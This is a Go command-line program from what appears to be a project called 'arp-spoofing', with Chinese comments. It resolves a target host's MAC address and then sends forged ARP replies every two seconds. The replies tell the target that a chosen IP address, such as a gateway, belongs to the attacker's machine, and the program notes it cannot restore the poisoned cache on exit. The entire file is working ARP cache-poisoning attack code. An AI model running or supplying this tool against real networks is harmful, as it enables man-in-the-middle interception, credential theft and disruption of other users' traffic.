package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"time"

	"arp-spoofing/internal/arpapp"
	"github.com/mdlayher/arp"
)

// ARP Reply：spoofedIP 的 MAC 地址是本机 mac
func writeGratuitousARP(client *arp.Client, spoofed, target arpapp.Endpoint) error {
	pkt, err := arp.NewPacket(
		arp.OperationReply,
		spoofed.MAC, // 发送者硬件地址
		spoofed.IP,  // 发送者协议地址
		target.MAC,  // 目标硬件地址
		target.IP,   // 目标协议地址
	)
	if err != nil {
		return err
	}
	return client.WriteTo(pkt, target.MAC)
}

func run(ifname, targetIPStr, spoofedIPStr string) error {
	iface, myIP, err := arpapp.GetInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	targetIP, err := arpapp.ParseIPv4(targetIPStr)
	if err != nil {
		return err
	}

	spoofedIP, err := arpapp.ParseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	client, err := arp.Dial(iface)
	if err != nil {
		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
	}
	defer client.Close()

	// 进行 ARP, 得到 target Ip 的 MAC 地址
	targetMAC, err := client.Resolve(targetIP)
	if err != nil {
		return fmt.Errorf("resolve MAC for %s: %w", targetIP, err)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Printf("[*] Local MAC : %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP  : %s\n", myIP)
	fmt.Printf("[*] Spoofing  : %s is at %s\n", spoofedIP, iface.HardwareAddr)
	fmt.Printf("[*] Set target : %s is at %s\n", targetIP, targetMAC)
	fmt.Println("[*] Sending gratuitous ARP every 2 seconds")
	fmt.Println("[*] Press Ctrl+C to exit")

	spoofed := arpapp.Endpoint{IP: spoofedIP, MAC: iface.HardwareAddr}
	target := arpapp.Endpoint{IP: targetIP, MAC: targetMAC}
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		if err := writeGratuitousARP(client, spoofed, target); err != nil {
			fmt.Fprintf(os.Stderr, "send gratuitous ARP: %v\n", err)
		} else {
			fmt.Printf("[+] Sent gratuitous ARP: %s is at %s\n", spoofedIP, iface.HardwareAddr)
		}

		select {
		case <-ctx.Done():
			fmt.Println("\n[*] Exiting (no restore capability without target IP)")
			return nil
		case <-ticker.C:
		}
	}
}

func main() {
	var ifname, targetIP, spoofedIP string
	flag.StringVar(&ifname, "i", "", "network interface")
	flag.StringVar(&targetIP, "t", "", "target IPv4 address")
	flag.StringVar(&spoofedIP, "s", "", "spoofed IPv4 address")
	flag.Parse()

	if ifname == "" || targetIP == "" || spoofedIP == "" {
		flag.Usage()
		os.Exit(1)
	}

	if err := run(ifname, targetIP, spoofedIP); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
